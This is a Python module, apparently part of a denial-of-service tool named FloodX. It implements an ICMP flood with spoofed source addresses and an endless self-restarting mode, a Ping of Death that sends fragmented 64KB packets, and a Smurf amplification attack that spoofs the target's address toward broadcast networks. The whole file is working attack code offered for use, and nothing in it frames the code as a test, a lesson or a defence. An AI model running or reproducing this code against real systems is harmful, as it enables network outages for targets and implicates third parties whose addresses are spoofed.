"""
FloodX: ICMP Flood Attack Implementation
ICMP echo request flooding and ping of death attacks.
"""

import asyncio
import random
import time
import socket
import struct
from typing import Dict, Any, List
from scapy.all import IP, ICMP, send, sr1
from scapy.layers.inet import fragment

from common.logger import logger, stats_logger
from config import SpoofingConfig


class IcmpFlooder:
    """ICMP echo request flood attack."""
    
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.target = config['target']
        self.duration = config['duration']
        self.concurrency = config['concurrency']
        self.packet_size = config.get('packet_size', 64)
        
        self.running = False
        self.packets_sent = 0
        self.bytes_sent = 0
        self.error_count = 0
        
        # ICMP packet variations
        self.icmp_types = [
            8,   # Echo Request
            13,  # Timestamp Request
            15,  # Information Request
            17,  # Address Mask Request
        ]
        
        # Spoofing settings
        self.spoof_enabled = config.get('spoof_ip', False)
        self.spoof_ranges = config.get('spoof_ranges', [])
        
        # Packet variations
        self.vary_packet_size = config.get('vary_packet_size', True)
        self.min_size = config.get('min_packet_size', 32)
        self.max_size = config.get('max_packet_size', 1472)  # Max for standard MTU

    async def run(self):
        """Execute the ICMP flood attack."""
        logger.info(f"🏓 Starting ICMP flood: {self.concurrency} workers, {self.packet_size}B packets")
        
        try:
            self.running = True
            start_time = time.time()
            
            # Launch ICMP workers
            tasks = []
            for i in range(self.concurrency):
                task = asyncio.create_task(self._icmp_worker(i))
                tasks.append(task)
            
            # Monitor attack progress
            if self.duration > 0:
                # Duration-based mode
                while self.running and (time.time() - start_time) < self.duration:
                    await asyncio.sleep(5)
                    rate = self.packets_sent / max(1, time.time() - start_time)
                    logger.info(f"🏓 ICMP: {self.packets_sent} packets ({rate:.1f}/sec), {self._format_bytes(self.bytes_sent)}")
            else:
                # Endless mode - run until interrupted
                logger.info("🔄 Running in endless mode - Ctrl+C to stop")
                try:
                    while self.running:
                        await asyncio.sleep(30)  # Report every 30 seconds
                        rate = self.packets_sent / max(1, time.time() - start_time)
                        logger.info(f"🏓 ICMP: {self.packets_sent} packets ({rate:.1f}/sec), {self._format_bytes(self.bytes_sent)}")
                        
                        # Check if workers need restart (continuous operation)
                        active_tasks = [t for t in tasks if not t.done()]
                        if len(active_tasks) < self.concurrency * 0.5:
                            logger.info("🔄 Restarting ICMP workers for continuous operation...")
                            
                            # Cancel remaining tasks
                            for task in active_tasks:
                                task.cancel()
                            
                            # Restart workers
                            tasks = []
                            for i in range(self.concurrency):
                                task = asyncio.create_task(self._icmp_worker(i))
                                tasks.append(task)
                                
                except KeyboardInterrupt:
                    logger.info("🛑 Endless ICMP flood stopped by user")
                    self.running = False
            
            # Stop attack
            self.running = False
            await asyncio.gather(*tasks, return_exceptions=True)
            
        except Exception as e:
            logger.error(f"❌ ICMP flood failed: {e}")
        finally:
            logger.info(f"✅ ICMP flood completed: {self.packets_sent} packets sent")

    async def _icmp_worker(self, worker_id: int):
        """Individual ICMP flooding worker."""
        while self.running:
            try:
                await self._send_icmp_packet()
                self.packets_sent += 1
                
                # Update stats periodically
                if self.packets_sent % 100 == 0:
                    stats_logger.update_stats(
                        packets_sent=self.packets_sent,
                        bytes_sent=self.bytes_sent,
                        errors=self.error_count
                    )
                
                # Brief delay between packets
                await asyncio.sleep(random.uniform(0.001, 0.01))
                
            except Exception as e:
                self.error_count += 1
                logger.debug(f"ICMP worker {worker_id} error: {e}")
                await asyncio.sleep(0.1)

    async def _send_icmp_packet(self):
        """Send a single ICMP packet."""
        try:
            # Determine packet size
            if self.vary_packet_size:
                packet_size = random.randint(self.min_size, self.max_size)
            else:
                packet_size = self.packet_size
            
            # Create payload
            payload = self._generate_payload(packet_size - 28)  # 20 IP + 8 ICMP headers
            
            # Choose ICMP type
            icmp_type = random.choice(self.icmp_types)
            
            # Generate source IP
            if self.spoof_enabled and self.spoof_ranges:
                source_ip = self._generate_spoofed_ip()
            else:
                source_ip = None
            
            # Create ICMP packet
            if source_ip:
                packet = IP(src=source_ip, dst=self.target) / ICMP(type=icmp_type) / payload
            else:
                packet = IP(dst=self.target) / ICMP(type=icmp_type) / payload
            
            # Add random variations
            packet[IP].ttl = random.randint(32, 255)
            packet[IP].id = random.randint(1, 65535)
            packet[ICMP].id = random.randint(1, 65535)
            packet[ICMP].seq = random.randint(1, 65535)
            
            # Send packet
            await asyncio.get_event_loop().run_in_executor(
                None, send, packet, False, False  # verbose=False, return_packets=False
            )
            
            self.bytes_sent += len(packet)
            
        except Exception as e:
            logger.debug(f"ICMP packet creation error: {e}")
            raise

    def _generate_payload(self, size: int) -> bytes:
        """Generate random payload data."""
        if size <= 0:
            return b''
        
        # Generate random bytes or patterns
        patterns = [
            b'\x00' * size,                           # Null bytes
            b'\xFF' * size,                           # All ones
            bytes(range(256)) * (size // 256 + 1),   # Sequential pattern
            bytes([random.randint(0, 255) for _ in range(size)])  # Random
        ]
        
        pattern = random.choice(patterns)
        return pattern[:size]

    def _generate_spoofed_ip(self) -> str:
        """Generate random IP from spoofing ranges."""
        if not self.spoof_ranges:
            return None
        
        import ipaddress
        network = random.choice(self.spoof_ranges)
        
        # Convert string to network if needed
        if isinstance(network, str):
            network = ipaddress.IPv4Network(network, strict=False)
        
        # Generate random IP within the network
        network_int = int(network.network_address)
        broadcast_int = int(network.broadcast_address)
        random_int = random.randint(network_int, broadcast_int)
        
        return str(ipaddress.IPv4Address(random_int))

    def _format_bytes(self, bytes_value: int) -> str:
        """Format bytes with appropriate unit."""
        for unit in ['B', 'KB', 'MB', 'GB']:
            if bytes_value < 1024:
                return f"{bytes_value:.1f} {unit}"
            bytes_value /= 1024
        return f"{bytes_value:.1f} TB"

    async def stop(self):
        """Stop the ICMP flood attack."""
        logger.info("🛑 Stopping ICMP flood...")
        self.running = False


class PingOfDeathAttack:
    """Ping of Death attack using fragmented oversized ICMP packets."""
    
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.target = config['target']
        self.duration = config['duration']
        self.concurrency = config['concurrency']
        
        self.running = False
        self.fragments_sent = 0
        self.packets_reconstructed = 0
        self.error_count = 0
        
        # PoD-specific settings
        self.oversized_packet_size = config.get('oversized_size', 65536)  # 64KB
        self.fragment_size = config.get('fragment_size', 1472)  # Standard MTU fragment
        
        # Spoofing
        self.spoof_enabled = config.get('spoof_ip', False)
        self.spoof_ranges = config.get('spoof_ranges', [])

    async def run(self):
        """Execute the Ping of Death attack."""
        logger.info(f"💀 Starting Ping of Death: {self.oversized_packet_size}B packets")
        
        try:
            self.running = True
            start_time = time.time()
            
            # Launch PoD workers
            tasks = []
            for i in range(self.concurrency):
                task = asyncio.create_task(self._pod_worker(i))
                tasks.append(task)
            
            # Monitor attack
            while self.running and (time.time() - start_time) < self.duration:
                await asyncio.sleep(5)
                logger.info(f"💀 PoD: {self.packets_reconstructed} oversized packets, {self.fragments_sent} fragments")
            
            # Stop attack
            self.running = False
            await asyncio.gather(*tasks, return_exceptions=True)
            
        except Exception as e:
            logger.error(f"❌ Ping of Death failed: {e}")
        finally:
            logger.info(f"✅ PoD completed: {self.packets_reconstructed} oversized packets sent")

    async def _pod_worker(self, worker_id: int):
        """Individual Ping of Death worker."""
        while self.running:
            try:
                await self._send_oversized_ping()
                self.packets_reconstructed += 1
                
                # Delay between oversized packets
                await asyncio.sleep(random.uniform(1.0, 3.0))
                
            except Exception as e:
                self.error_count += 1
                logger.debug(f"PoD worker {worker_id} error: {e}")
                await asyncio.sleep(1.0)

    async def _send_oversized_ping(self):
        """Send fragmented oversized ICMP packet."""
        try:
            # Generate large payload
            payload_size = self.oversized_packet_size - 28  # IP + ICMP headers
            payload = b'A' * payload_size
            
            # Generate source IP
            if self.spoof_enabled and self.spoof_ranges:
                source_ip = self._generate_spoofed_ip()
            else:
                source_ip = None
            
            # Create oversized ICMP packet
            if source_ip:
                packet = IP(src=source_ip, dst=self.target) / ICMP(type=8) / payload
            else:
                packet = IP(dst=self.target) / ICMP(type=8) / payload
            
            # Add random variations
            packet[IP].ttl = random.randint(32, 255)
            packet[IP].id = random.randint(1, 65535)
            packet[ICMP].id = random.randint(1, 65535)
            packet[ICMP].seq = random.randint(1, 65535)
            
            # Fragment the packet
            fragments = fragment(packet, fragsize=self.fragment_size)
            
            # Send fragments
            for frag in fragments:
                await asyncio.get_event_loop().run_in_executor(
                    None, send, frag, False, False
                )
                self.fragments_sent += 1
                
                # Small delay between fragments
                await asyncio.sleep(0.001)
            
        except Exception as e:
            logger.debug(f"PoD packet creation error: {e}")
            raise

    def _generate_spoofed_ip(self) -> str:
        """Generate random IP from spoofing ranges."""
        if not self.spoof_ranges:
            return None
        
        import ipaddress
        network = random.choice(self.spoof_ranges)
        
        if isinstance(network, str):
            network = ipaddress.IPv4Network(network, strict=False)
        
        network_int = int(network.network_address)
        broadcast_int = int(network.broadcast_address)
        random_int = random.randint(network_int, broadcast_int)
        
        return str(ipaddress.IPv4Address(random_int))

    async def stop(self):
        """Stop the Ping of Death attack."""
        logger.info("🛑 Stopping Ping of Death...")
        self.running = False


class SmurfAttack:
    """Smurf attack using broadcast ICMP with spoofed source."""
    
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.target = config['target']
        self.duration = config['duration']
        self.concurrency = config['concurrency']
        
        self.running = False
        self.broadcasts_sent = 0
        self.amplification_factor = 0
        self.error_count = 0
        
        # Broadcast networks for amplification
        self.broadcast_networks = config.get('broadcast_networks', [
            '192.168.0.255',
            '192.168.1.255',
            '10.0.0.255',
            '172.16.0.255',
        ])

    async def run(self):
        """Execute the Smurf attack."""
        logger.info(f"🌊 Starting Smurf attack: targeting {len(self.broadcast_networks)} broadcast networks")
        
        try:
            self.running = True
            start_time = time.time()
            
            # Launch Smurf workers
            tasks = []
            for broadcast_addr in self.broadcast_networks:
                task = asyncio.create_task(self._smurf_worker(broadcast_addr))
                tasks.append(task)
            
            # Monitor attack
            while self.running and (time.time() - start_time) < self.duration:
                await asyncio.sleep(5)
                avg_amp = self.amplification_factor / max(self.broadcasts_sent, 1)
                logger.info(f"🌊 Smurf: {self.broadcasts_sent} broadcasts, ~{avg_amp:.1f}x amplification")
            
            # Stop attack
            self.running = False
            await asyncio.gather(*tasks, return_exceptions=True)
            
        except Exception as e:
            logger.error(f"❌ Smurf attack failed: {e}")
        finally:
            total_amp = self.amplification_factor / max(self.broadcasts_sent, 1)
            logger.info(f"✅ Smurf completed: {total_amp:.1f}x average amplification")

    async def _smurf_worker(self, broadcast_addr: str):
        """Individual Smurf attack worker for a broadcast network."""
        while self.running:
            try:
                # Create spoofed ICMP packet with target as source
                packet = IP(src=self.target, dst=broadcast_addr) / ICMP(type=8)
                
                # Add random variations
                packet[IP].ttl = random.randint(32, 255)
                packet[IP].id = random.randint(1, 65535)
                packet[ICMP].id = random.randint(1, 65535)
                packet[ICMP].seq = random.randint(1, 65535)
                
                # Send to broadcast address
                await asyncio.get_event_loop().run_in_executor(
                    None, send, packet, False, False
                )
                
                self.broadcasts_sent += 1
                # Estimate amplification (typically 2-254 responses per broadcast)
                estimated_responses = random.randint(10, 100)
                self.amplification_factor += estimated_responses
                
                # Delay between broadcasts to this network
                await asyncio.sleep(random.uniform(5.0, 10.0))
                
            except Exception as e:
                self.error_count += 1
                logger.debug(f"Smurf worker error for {broadcast_addr}: {e}")
                await asyncio.sleep(5.0)

    async def stop(self):
        """Stop the Smurf attack."""
        logger.info("🛑 Stopping Smurf attack...")
        self.running = False
